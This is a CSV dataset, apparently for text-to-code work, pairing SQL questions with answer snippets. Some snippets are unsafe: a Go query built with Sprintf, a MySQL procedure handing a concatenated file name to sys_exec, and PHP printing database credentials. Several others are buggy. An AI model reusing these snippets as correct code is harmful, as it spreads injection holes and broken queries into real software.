,Unnamed: 0,NL,Code
32958,17102,Oracle equivalent for SQL Server INSERTED and DELETED tables,"create or replace PROCEDURE CreateTrackingTriggers
(
-- take the target table and shadow user as agruments
v_TableName IN NVARCHAR2 DEFAULT NULL,
v_ShadowUser IN NVARCHAR2 DEFAULT 'SHADOW_USER' 
)
AUTHID CURRENT_USER -- grant permission to create triggers
AS
v_TriggerName NVARCHAR2(500);
v_ColList NVARCHAR2(2000);
v_ColList_shadow NVARCHAR2(2000);
v_SQLCommand VARCHAR2(4000);
v_ColName NVARCHAR2(500);
v_ColSize NUMBER(10,0);
v_Prefix NVARCHAR2(500);
v_count  NUMBER(1,0);

BEGIN

DECLARE
  -- define a cursor to get the columns of the target table. order by COLUMN_ID is important
  CURSOR Cols
  IS SELECT COLUMN_NAME , CHAR_COL_DECL_LENGTH  FROM USER_TAB_COLS
  WHERE TABLE_NAME =  upper(v_TableName) order by COLUMN_ID;
  -- define a cursor to get the columns of the target shadow table order by COLUMN_ID is important
  CURSOR Shadow_Cols
  IS SELECT COLUMN_NAME , CHAR_COL_DECL_LENGTH  FROM ALL_TAB_COLS
  WHERE TABLE_NAME =  upper(v_TableName) and upper(owner)=upper(v_ShadowUser) order by COLUMN_ID;

BEGIN
  -- generate the trigger name for target table
  v_TriggerName := 'TRG_' || upper(v_TableName) || '_Track' ;

  -- check v_count , determine whether shdow table exist if not handle it
  select count(*) into v_count from all_tables where table_name = upper(v_TableName) and owner = upper(v_ShadowUser);

 -- iterate the cursor. generating column names prefixing  ':new.'

  OPEN Cols;
  FETCH Cols INTO v_ColName,v_ColSize;
 WHILE Cols%FOUND 
  LOOP 

     BEGIN
           IF v_ColList IS NULL THEN
             v_ColList :=  ':new.'||v_ColName ;
           ELSE
             v_ColList := v_ColList || ',' || ':new.'||v_ColName;
           END IF;

        FETCH Cols INTO v_ColName,v_ColSize;
     END;
  END LOOP;

  CLOSE Cols;

  -- iterate the cursor. get the shadow table columns

  OPEN Shadow_Cols;
  FETCH Shadow_Cols INTO v_ColName,v_ColSize;

 WHILE Shadow_Cols%FOUND 
  LOOP 

     BEGIN

           IF v_ColList_shadow IS NULL THEN
             v_ColList_shadow := v_ColName;
           ELSE
             v_ColList_shadow := v_ColList_shadow || ',' || v_ColName;
           END IF;

        FETCH Shadow_Cols INTO v_ColName,v_ColSize;
     END;
  END LOOP;

  CLOSE Shadow_Cols;

-- create trigger command. This will generate the trigger that dupilicates target   table's data into shdow table
v_SQLCommand := 'CREATE or REPLACE TRIGGER '||v_TriggerName||'
AFTER INSERT OR UPDATE OR DELETE ON '||upper(v_TableName)||'
REFERENCING OLD AS old NEW AS new 
FOR EACH ROW

DECLARE    
  ErrorCode NUMBER(19,0);
BEGIN

 -- v_ColList_shadow : shdow table column list
 -- v_ColList : target table column list with :new prefixed 
 INSERT INTO '|| v_ShadowUser ||'.'||upper(v_TableName)||'('||v_ColList_shadow||') values    ('||v_ColList||');
 EXCEPTION
   WHEN OTHERS THEN ErrorCode := SQLCODE;
 END;';

 EXECUTE IMMEDIATE v_SQLCommand;
 END;
END;
"
26452,62086,how to achieve the start time of another variable as the end time of the variable coming before it?,"SELECT LAG(TimeEnd, 1) OVER (ORDER BY PhaseID) TimeStart
"
1667,24539,InterSystems cache - how to insert into a join table?,"Insert into MyApp.Parent_Children values (1,null,2,'fzj')
"
17794,22945,Query using a SQL reference table,"SELECT dt.ID,dt.Title,dt.description,
       L1.Description as LocationDescription,
       L2.Description as CategoryDescription  ...

FROM data dt
JOIN Reference L1 on dt.location=L1.Reference and L1.ID=='LO'
JOIN Reference L2 on dt.category=L2.Reference and L2.ID=='CA'
"
36116,67317,Adding a inner join to this query,"SELECT l.id, 
(SELECT amount FROM lead_status WHERE lead_id = l.id AND buyer = 'BUYER_PROXY') AS our_bid,
(SELECT amount FROM lead_status WHERE lead_id = l.id AND buyer != 'BUYER_PROXY' AND discriminator='AUTO_PING' ORDER BY amount DESC LIMIT 1) AS best_bid,
(SELECT amount FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) AS final_sold_amount,
(SELECT buyer FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) AS buyer,
c.email
FROM leads AS l
INNER JOIN contacts AS c ON l.id = c.lead_id
WHERE l.state = 'ACCEPTED'
AND (SELECT buyer FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) != 'TEST'
AND DATE(l.create_date) > '2011-12-01'
"
26547,46968,SQL Server with RegExp,"where cast(right(data, 8) as date) = cast(getdate() as date)
"
1601,73434,SELECT multiple Records - MySQL,"SELECT T.*
  FROM (SELECT g.4digits, c.company_name, os.*,
               CASE 
                 WHEN @gistype != g.4digits THEN @rownum := 1 
                 ELSE @rownum := @rownum + 1 
               END AS seq,
               @gistype := g.4digits AS var_gistype
          FROM overall_scores os 
          JOIN company c
          ON c.company_id = os.company_id
          JOIN gics g
          ON g.company_id = c.company_id
          AND g.4digits in ((2550), (4010), (2540))
          AND os.overall_score <> 'NA'
          AND os.overall_score <> 'NaN'
          JOIN (SELECT @rownum := NULL, @gistype := '') r
      ORDER BY g.4digits, os.overall_score asc) T
 WHERE T.seq <= 5
"
26538,29878,Adding values from two table and storing into third table,"INSERT INTO Table1 (Amount, ContactName, State, City) 
values 
(
    (Select nvl(max(Amount),0) from Table2 where id=12)+
    (Select nvl(max(Amount),0) from Table3 where id=13),
    'Sam','Newyork','Newyork'
);
"
15680,46025,SQL Server (T-SQL) Insert if Don't Exist,"INSERT INTO dbo.tblBootStrapperInstruments (CCY, Instrument, Tenor) 
SELECT mx.CCY,mx.Instrument,mx.Gridpoint FROM dbo.Feed_Murex_Intraday_DF mx
LEFT OUTER JOIN dbo.tblBootStrapperInstruments bs 
ON bs.CCY = mx.CCY 
AND bs.Instrument = mx.Instrument 
AND bs.Tenor = mx.Gridpoint
WHERE bs.CCY IS NULL
"
2835,13867,Get the associated name of two database columns of the same type,"SELECT dep.name AS departure_airport, arr.name AS arrival_airport 
FROM flights f
    JOIN airports dep ON f.departure_airport_id = dep.id 
    JOIN airports arr ON f.arrival_airport_id = arr.id
"
14122,43788,"SQL,multiple counts with multiple results","AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')

SELECT TO_DATE(TRAIN.DEPARTURE_DATE,'YYYYMM')
  , (select COUNT(DISTINCT DEPARTURE_DATE) 
     FROM TRAIN ti
     WHERE PERSON_ID='28' AND DEPARTURE_STATION = 'DUBLIN' AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')) AS Mark
  , (select COUNT(DISTINCT DEPARTURE_DATE) 
     FROM TRAIN 
     WHERE PERSON_ID='29' AND DEPARTURE_STATION = 'DUBLIN' AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')) AS Chris 
FROM TRAIN to
GROUP BY DEPARTURE_DATE
"
34305,62428,How can I use a parameterized query to search on a column by its name?,"db.Query(fmt.Sprintf(""SELECT * FROM mytable WHERE %s = ?"", col), searchStr)
"
10211,27492,Oracle function to distinct NULL values based on other column,"SELECT column1, column2 
  FROM dummy t1
 WHERE column2 IS NOT NULL 
       OR NOT EXISTS (SELECT '' 
                        FROM dummy t2 
                       WHERE t1.column1 = t2.column1 
                         AND column2 IS NOT NULL)
"
15668,43152,How to get Sql Server XML variable into TEXT column,"declare @xml xml

declare @tblTest table (
    Id int,
    XMLColumn text
)

insert into @tblTest
    (Id, XMLColumn)
    values
    (1, '<MyTest><TestNode>A</TestNode></MyTest>')

set @xml =  '<MyTest><TestNode>A</TestNode><TestNode>B</TestNode></MyTest>'

update @tblTest
    set XMLColumn = cast(@xml as varchar(max))
    where Id = 1

select Id, XMLColumn from @tblTest
"
35274,67917,What would a Database Diagram (ER Diagram/Table Layout) look like for measuring distribution of something?,"LOGID (PK)  ACTIVITYID  SOURCE  DATELOGGED
----------  ----------  ------  ----------
"
10628,45385,SQL Query- Not able to compare fields values?,"WHERE DATE(played_dt) = '2009-06-16'
"
9995,22338,MySQL join of 3 tables - get aggregate value from 2 child tables,"SELECT u.userId, COUNT(DISTINCT table1.webId), COUNT(DISTINCT table2.webId)
FROM `user` u 
LEFT JOIN `table1` t1
    ON u.userId = t1.userId
LEFT JOIN `table2` t2
    ON u.userId = t2.userId
GROUP BY u.userId
"
10779,11158,SELECT chaining the result of two queries on MYSQL,"SELECT a.x AS x, a.y AS y FROM a
UNION ALL
SELECT b.x AS x, b.y AS y FROM b
"
4677,61090,Return SUM of all columns in a row dynamically,"USE mydatabase
DECLARE 
    @table varchar(max) = 'myTable',
    @exec nvarchar(max);

select
    @exec = 'select SUM('+RIGHT(c,LEN(c)-1)+') from '+@table
from (
    select
        '+'+c.name 
    from sys.columns c
    inner join sys.tables t on
        c.object_id = t.object_id
    inner join sys.types ty on
        c.user_type_id = ty.user_type_id
    where
        ty.name in ('int') and
        t.name = PARSENAME(@table,1)
    FOR XML PATH('')
) T (c)
print @exec
exec sp_executesql @exec
"
14300,32780,SQL: How to find the minimum number of entries linked from one table to another,"WITH link_counts AS (
         SELECT a_id, COUNT(b_id) as num_links
           FROM table_c
       GROUP BY a_id
     )
SELECT a_id
  FROM link_counts
 WHERE num_links <= (SELECT MIN(num_links) FROM link_counts)
"
34688,63151,How do I count total of value in one column with different data,"select  UserGroup
,       count(case when UserStatus = 1 then 1 end) as Status_1
,       count(case when UserStatus = 2 then 1 end) as Status_2
,       count(case when UserStatus = 3 then 1 end) as Status_3
,       count(case when UserStatus = 4 then 1 end) as Status_4
from    table_group
group by
        UserGroup
"
11857,21014,"Joining Two Tables, but how to show all results?","SELECT e.*,w.* 
FROM episodes e 
LEFT JOIN watchlist w 
   ON e.episode_id=w.watchlist_series_episode_id AND w.watchlist_user_id='1'
WHERE e.episode_series_id='1' 
AND e.episode_series_season='1' 
"
32568,46607,MySQL Get result of loading data from file,"DELIMITER $$

DROP PROCEDURE IF EXISTS load_data$$

CREATE PROCEDURE load_data(pfile VARCHAR(100), pdbtable VARCHAR(100))
BEGIN
    DECLARE exec_str VARCHAR(500);
    DECLARE ret_val INT;
    IF (check_10m_file() = 'file ok') THEN
        SET exec_str := CONCAT('sh /server/loadpath/load.sh ', pfile, ' ', pdbtable);
        SET ret_val := sys_exec(exec_str);
        IF ret_val = 0 THEN
            SELECT 'OK' Result;
        ELSE
            SELECT 'ERROR' Result;
        END IF;
    END IF;
END$$

DELIMITER ;

CALL load_data('/server/filepath/file.csv', 'mydb.mytable');
"
15231,59238,Find any letter in a string SQL Server 2008 R2,"When [Page] like '[0-9][A-Z]' then left([Page],1)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
When [Page] like '[0-9][0-9][A-Z]' then left([Page],2)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
When [Page] like '[0-9][0-9][0-9][A-Z]' then left([Page],3)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
"
39393,25202,Building a SQL to calculate the number of rows relating to the parent,"SELECT Shop.name, COUNT(*) AS Num_Orders
FROM Shop JOIN `Order` ON Shop.id = `Order`.id
WHERE DATE(`Order`.`date`) = '2011-7-13'
GROUP BY `Order`.id;
"
18968,33611,Optimal Query for a problem,"SELECT news.*, votes.vote_type
FROM news 
LEFT OUTER JOIN votes 
ON votes.`hash` = news.`hash` 
AND votes.`user_id` = #
"
12540,11675,Would it be possible to combine these SQL select statements?,"Executing (default): (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '1' LIMIT 1)
                     UNION ALL
                     (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '2' LIMIT 1)
                     UNION ALL
                     (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '3' LIMIT 1)

Executing (default): SELECT count(*) 
                     FROM `Videos` 
                     WHERE `GroupId` IN ('1', '2', '3')  AND `live` = true

Executing (default): (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '1' AND `live` = true ORDER BY `id` DESC LIMIT 20)
                     UNION ALL
                     (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '2' AND `live` = true ORDER BY `id` DESC LIMIT 20)
                     UNION ALL
                     (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '3' AND `live` = true ORDER BY `id` DESC LIMIT 20)
"
19234,58723,SQL Server Management Studio not showing correct data space of a table,"DBCC CLEANTABLE(0, N'dbo.YourTable');
"
19368,46594,SQL Get lowest level child and root node,"WITH r ( category_id, name, root, depth )
-- finds the root relationship
AS (
    SELECT category_id, name, category_id, 0
        FROM category
        -- WHERE parent IS NULL -- this would only look at root nodes
    UNION ALL
    SELECT c.category_id, c.name, r.root, r.depth + 1
        FROM r
        JOIN category c
            ON c.parent = r.category_id
), s ( category_id, name, root, window_id )
-- finds the lowest leaves
AS (
    SELECT category_id, name, root, RANK() OVER(partition by root order by depth DESC)
        FROM r
)
SELECT c.name AS NodeName, s.Name AS DeepLeafName
    FROM category c
    JOIN s
        ON c.category_id = s.root
        WHERE s.window_id = 1;
"
18678,41284,Most efficient way to query a database multiple times,"select distinct pa2.auth
from player_analytics pa join
     player_analytics pa2
     on pa.ip = pa2.ip and
        pa.auth = :auth and
        pa2.auth <> :auth;
"
16139,67923,historic 'slice' of table,"SELECT s1.ApplicantID, s1.SchoolID, s1.StatusID, s1.ChangeDate
FROM shadow s1
INNER JOIN
(
    SELECT ApplicantID, SchoolID, MAX(ChangeDate) AS maxDate
    FROM shadow
    GROUP BY ApplicantID, SchoolID
) s2
ON s1.ApplicantID = s2.ApplicantID AND s1.SchoolID = s2.SchoolID
    AND s1.ChangeDate = s2.maxDate
"
31771,50858,Using sql to find duplicate records and delete in same operation,"DELETE a FROM activities a 
   LEFT JOIN (SELECT MAX(id) AS id FROM activities GROUP BY name) uniqId 
   ON a.id=uniqId.id WHERE uniqId.id IS NULL;
"
28419,73134,Group By and add columns,"select ward,
       max(case when seqnum = 1 then councillor end) as councillor1,
       max(case when seqnum = 2 then councillor end) as councillor2,
       max(case when seqnum = 3 then councillor end) as councillor3
from (select wc.*,
             row_number() over (partition by ward order by councillor) as seqnum
      from ward_councillors wc
     ) wc
group by ward;
"
5808,41504,How to do a subquery against multiple phrases with LIKE or REGEXP?,"WHERE hashtag REGEXP (select GROUP_CONCAT(name SEPARATOR '|') from hashtags where hid = 1)
"
26827,42004,MS Access sum of related records,"SELECT VendorPartNumber, Sum(Quantity) as TotalAllocations
    FROM YourTable
    GROUP BY VendorPartNumber
"
5105,23333,How to get data for each month from current date sql query,"SELECT YEAR(CREATESTAMP), MONTH(CREATESTAMP) COUNT(R.REGID) AS TOTALCOUNT 
FROM REGISTRATION R
GROUP BY YEAR(CREATESTAMP), MONTH(CREATESTAMP)
ORDER BY YEAR(CREATESTAMP), MONTH(CREATESTAMP)
"
3778,37813,Drupal get database configuration,"<?php
  global $db_url;
  $creds =  parse_url($db_url);
  print $creds['user'];
  print $creds['pass'];
  var_dump($creds);
?>
"
26073,60708,Query optimization with rows referring to parents,"select ID, ParentID, CreatedDate
from (
        select ID, ParentID, CreatedDate, row_number() over(partition by isnull(ParentID, ID) order by CreatedDate desc) RowNumber
        from CustomerComplaint
   ) t
 where
    t.RowNumber = 1
"
5146,33741,"WHERE condition for ""starts with any of the values in a CSV list""","AND SUBSTR(product_group, 0, 3) IN
    (SELECT regexp_substr(strProductGroup, '[^,]+', 1, LEVEL)
      FROM dual
      CONNECT BY LEVEL <= length(regexp_replace(strProductGroup, '[^,]+')) + 1)
"
22776,9569,T-SQL creating a dynamic where statement?,"declare @sql nvarchar(max);
set @sql = N'select * from table where ' + quotename(@search) + N'=''1''';
exec sp_executesql @sql;
"
1868,8175,Retrieve xml node value using xmltable 11g for multi items,"for $i in PFA/Person/RoleDetail/Roles/OccTitle
   return <row>
   {
      $i/../../../@id,
      $i/../@RoleType,
      $i/@SinceDay,
      $i/@SinceMonth,
      $i/@SinceYear,
      $i/@ToDay,
      $i/@ToMonth,
      $i/@ToYear,
      $i/@OccCat,
      $i (: was missing :)
   } 
   </row>
"
2391,13451,ORACLE synonym table describe constraints,"SELECT constraint_name,
       c.table_name,
       synonym_name,
       S.OWNER
  FROM user_constraints C, all_SYNONYMS S
 WHERE     C.TABLE_NAME = S.TABLE_NAME
       AND S.TABLE_OWNER = C.OWNER
       AND S.Synonym_name = 'REGION_SYN_P'
"
24574,13924,"differences between ""foreign key"" and ""constraint foreign key""","CREATE TABLE Orders
 (
 O_Id int NOT NULL,
 OrderNo int NOT NULL,
 P_Id int,
 PRIMARY KEY (O_Id),
 CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id)
 REFERENCES Persons(P_Id)
 )
"
31035,22947,Multiple data types array in PostgreSQL,"create type my_item as (
    field_1        text,
    field_2        text,
    field_3        text,
    field_4        number
);
"
32603,21361,Table design issues - should I create separate fields or store as a blob,"Status (ID, Value) - essentially enumeration of possible values: Received, Acknowledged, Dispatched, ...
OrderStatus (ID, StatusID (FK to Status), AuditBy, AuditAt, Comment)
"
32885,30498,cloning a table from one database to another with same rowid's in sqlite,"INSERT INTO db2.MyTable(rowid, Name, whatever)
SELECT                  rowid, Name, whatever FROM MyTable;
"
25452,15107,"How do I ""collapse"" the following column data with TSQL in Access 2010?","SELECT [Year]
      ,PlaceID
      ,COUNT(CASE OffersMembership WHEN 'Y' THEN 1 ELSE 0 END) AS OffersMembership
      ,COUNT(CASE HasSeating WHEN 'Y' THEN 1 ELSE 0 END) AS HasSeating
      ,COUNT(CASE QuietArea WHEN 'Y' THEN 1 ELSE 0 END) AS QuietArea
  FROM MyTable t
 GROUP BY t.[Year]
         ,PlaceID
"
